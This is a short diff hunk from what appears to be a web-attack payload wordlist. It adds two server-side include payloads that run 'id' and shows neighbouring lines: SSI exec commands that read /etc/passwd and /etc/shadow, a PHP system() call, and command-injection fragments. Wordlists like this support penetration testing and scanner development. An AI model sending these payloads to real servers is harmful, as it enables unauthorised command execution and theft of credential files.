@@ -369,7 +369,9 @@
 <!--#exec cmd="/bin/cat /etc/passwd"-->
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/usr/bin/id;-->
+<!--#exec cmd="/usr/bin/id"-->
 <!--#exec cmd="id;-->
+<!--#exec cmd="id"-->
 <?php system("cat /etc/passwd");?>
 <id
 <id;
